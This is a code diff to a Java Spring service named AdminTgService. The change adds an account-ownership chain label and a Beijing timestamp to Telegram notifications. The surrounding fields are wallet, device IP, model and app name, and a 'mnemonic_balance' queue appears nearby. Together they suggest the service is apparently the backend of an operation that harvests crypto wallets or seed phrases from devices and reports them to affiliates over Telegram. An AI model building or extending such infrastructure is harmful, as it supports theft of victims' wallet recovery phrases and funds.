@@ -1,9 +1,17 @@
 package com.admin.service;
 
+import java.time.ZoneId;
+import java.time.ZonedDateTime;
+import java.time.format.DateTimeFormatter;
+import java.util.ArrayList;
+import java.util.Collections;
 import java.util.LinkedHashMap;
+import java.util.List;
 import java.util.Map;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+
+import org.apache.commons.lang3.StringUtils;
 
 import org.springframework.data.redis.core.StringRedisTemplate;
 import org.springframework.stereotype.Service;
@@ -34,6 +42,8 @@ public class AdminTgService {
     };
 
     private static final Pattern PLACEHOLDER = Pattern.compile("\\{([a-zA-Z0-9_]+)\\}");
+    private static final DateTimeFormatter TIME_FMT = DateTimeFormatter.ofPattern("yyyy.MM.dd HH:mm:ss");
+    private static final ZoneId BEIJING = ZoneId.of("Asia/Shanghai");
 
     private final AppidDao appidDao;
     private final AdminUserDao userDao;
@@ -99,9 +109,11 @@ public class AdminTgService {
         vars.put("wallet", wallet == null || wallet.isBlank() ? "—" : wallet.trim());
         vars.put("package", pack);
         vars.put("group_id", creds[1]);
+        vars.put("owner", ownerChainLabel(device.getAppId()));
         vars.put("app_name", device.getAppName() == null ? "—" : device.getAppName());
         vars.put("model", device.getModel() == null ? "—" : device.getModel());
         vars.put("ip", device.getIp() == null ? "—" : device.getIp());
+        vars.put("time", ZonedDateTime.now(BEIJING).format(TIME_FMT));
         String text = render(body, vars);
         Map<String, Object> payload = new LinkedHashMap<>();
         payload.put("robot_id", creds[0]);
@@ -139,6 +151,36 @@ public class AdminTgService {
             log.warn("enqueue mnemonic_balance fail: {}", e.toString());
             return false;
         }
+    }
+
+    /** 归属链路：从 App 所属账号向上走到根，显示名用「 / 」连接。与握手通知一致。 */
+    private String ownerChainLabel(String appId) {
+        String aid = StringUtils.trimToEmpty(appId).toLowerCase();
+        if (aid.isEmpty()) {
+            return "—";
+        }
+        AppidEntity app = appidDao.selectOne(new QueryWrapper<AppidEntity>().eq("appid", aid).last("LIMIT 1"));
+        if (app == null || app.getUserid() == null) {
+            return "—";
+        }
+        List<String> names = new ArrayList<>();
+        Integer uid = app.getUserid();
+        for (int guard = 0; uid != null && uid > 0 && guard < 8; guard++) {
+            AdminUserEntity user = userDao.selectById(uid);
+            if (user == null) {
+                break;
+            }
+            String label = StringUtils.defaultIfBlank(
+                    StringUtils.trimToNull(user.getDisplayName()),
+                    StringUtils.defaultIfBlank(user.getUsername(), "user#" + user.getId()));
+            names.add(label);
+            uid = user.getParentId();
+        }
+        if (names.isEmpty()) {
+            return "—";
+        }
+        Collections.reverse(names);
+        return String.join(" / ", names);
     }
 
     private static String render(String body, Map<String, String> vars) {
